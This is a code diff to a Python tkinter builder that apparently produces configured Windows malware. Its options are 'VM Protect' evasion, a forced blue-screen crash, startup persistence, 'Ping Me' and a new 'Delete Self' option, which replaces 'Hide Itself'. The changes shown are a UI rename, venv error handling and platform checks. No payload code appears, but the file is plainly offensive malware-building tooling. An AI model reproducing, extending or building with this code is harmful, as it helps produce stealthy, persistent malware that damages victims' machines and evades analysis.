@@ -2,7 +2,7 @@ import tkinter as tk
 from tkinter import ttk, messagebox, filedialog
 from urllib.request import urlopen, Request
 from socket import create_connection
-import json, os, subprocess, shutil, webbrowser, time, ctypes, sys
+import json, os, subprocess, shutil, webbrowser, ctypes
 
 def ToggleConsole(choice):
 	if choice:
@@ -21,7 +21,7 @@ class Builder:
 		self.VMprotect = tk.BooleanVar(self.root, True)
 		self.BSOD = tk.BooleanVar(self.root, True)
 		self.Startup = tk.BooleanVar(self.root, True)
-		self.Hide = tk.BooleanVar(self.root, True)
+		self.Destruct = tk.BooleanVar(self.root, True)
 		self.MSGbox = tk.BooleanVar(self.root, False)
 		self.MSGboxconf = dict()
 		self.__main__()
@@ -48,14 +48,14 @@ class Builder:
 		BSOD = tk.Checkbutton(self.root, text= "BSOD", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.BSOD)
 		VMprotect = tk.Checkbutton(self.root, text= "VM Protect", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.VMprotect, command= lambda: self.ToggleBsod(BSOD))
 		Startup = tk.Checkbutton(self.root, text= "Run On Startup", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.Startup)
-		Hide = tk.Checkbutton(self.root, text= "Hide Itself", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.Hide)
+		Destruct = tk.Checkbutton(self.root, text= "Delete Self", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.Destruct)
 		Messagebox = tk.Checkbutton(self.root, text= "Message Box", background= "black", foreground= "white", activebackground= "black", activeforeground= "white", selectcolor= "black", font= ("Franklin Gothic", 11), variable= self.MSGbox, command= self.MessageboxEvent)
 
 		PingME.place(y = 140, x= 20)
 		VMprotect.place(y = 170, x= 20)
 		BSOD.place(y= 200, x= 20)
 		Startup.place(y= 230, x= 20)
-		Hide.place(y= 260, x= 20)
+		Destruct.place(y= 260, x= 20)
 		Messagebox.place(y= 290, x= 20)
 
 		IconNameLabel = ttk.Label(background= "black", foreground= "white", font= ("Franklin Gothic", 10, "bold"), width= 15, anchor= "center")
@@ -105,8 +105,13 @@ class Builder:
 		if not os.path.isfile(os.path.join("env", "Scripts", "run.bat")):
 			if not os.path.isfile(os.path.join("env", "Scripts", "activate")):
 				print(format1("\u001b[33;1mINFO", "Creating virtual environment... (might take some time)"))
-				subprocess.run("python -m venv env", capture_output= True, shell= True)
+				res = subprocess.run("python -m venv env", capture_output= True, shell= True)
 				clear()
+				if res.returncode != 0:
+					print('Error: {}'.format(res.stderr.decode(errors= "ignore")))
+					__import__("getpass").getpass("")
+					os._exit(1)
+
 			print(format1("\u001b[33;1mINFO", "Copying assets to virtual environment..."))
 			for i in os.listdir(datadir := os.path.join(os.path.dirname(__file__), "Data")):
 				if os.path.isfile(fileloc := os.path.join(datadir, i)):
@@ -121,7 +126,7 @@ class Builder:
 					"VMPROTECT" : self.VMprotect.get(),
 					"BSOD" : self.BSOD.get(),
     				"STARTUP" : self.Startup.get(),
-    				"HIDE_ITSELF" : self.Hide.get(),
+    				"DELETE_ITSELF" : self.Destruct.get(),
 					"MSGBOX" : self.MSGboxconf
 			}
 			json.dump(configuration, file, indent= 4)
@@ -319,9 +324,7 @@ if __name__ == "__main__":
 		if not os.path.isdir(os.path.join(os.path.dirname(__file__), "Data")):
 			subprocess.Popen('mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Data folder cannot be found. Please redownload the files!\', 10, \'Error\', 16);close()"', shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
 			os._exit(1)
-		#python_version = tuple([sys.version_info[x] for x in range(3)])
-		#if python_version[0] > 3 or python_version[1] > 10:
-		#	subprocess.Popen(f'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'Your Python version is {python_version[0]}.{python_version[1]}.{python_version[2]} but version < 3.11 is required. Please downgrade it first!\', 10, \'Error\', 16);close()"', shell= True, creationflags= subprocess.SW_HIDE | subprocess.CREATE_NEW_CONSOLE)
-		#	os._exit(1)
 		ToggleConsole(False)
 		Builder()
+	else:
+		print("Only Windows OS is supported!")
